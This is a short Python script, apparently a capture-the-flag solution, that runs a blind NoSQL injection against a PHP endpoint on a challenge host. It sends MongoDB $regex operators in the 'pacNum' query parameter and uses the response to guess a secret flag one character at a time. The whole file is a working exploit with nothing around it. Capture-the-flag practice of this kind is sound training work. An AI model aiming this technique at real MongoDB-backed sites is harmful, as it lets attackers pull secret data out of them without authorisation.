import sys
import string
import datetime
import requests

char_map = 'abcdef' + ''.join([str(i) for i in range(0, 10)]) + '}'


def match(buffer):
    regex = buffer.replace('{', '\\{').replace('}', '\\}')
    payload = 'https://mongo.jeopardy.websec.saarland/package.php?pacNum[$regex]=%s' % regex
    print('Trying : %s' % payload)
    access_r = requests.get(payload)
    return ('5up3r53cr3tP4ck4g3N4m3_1337' in access_r.text)


if __name__ == '__main__':

    char_index = 0
    char_buffer = 'SWAG{'

    while not char_buffer.endswith('}'):

        char_index += 1
        success = False

        print("Trying to get character at index %d..." % char_index)

        for current_char in char_map:
            if match(char_buffer + current_char):
                success = True
                char_buffer += current_char
                print("Success! Buffer %s" % char_buffer)
                break

        if not success:
            print('Failed to find character at index %d! Aborting...' % char_index)
            sys.exit(-1)


    print('Acquired buffer: %s' % char_buffer)
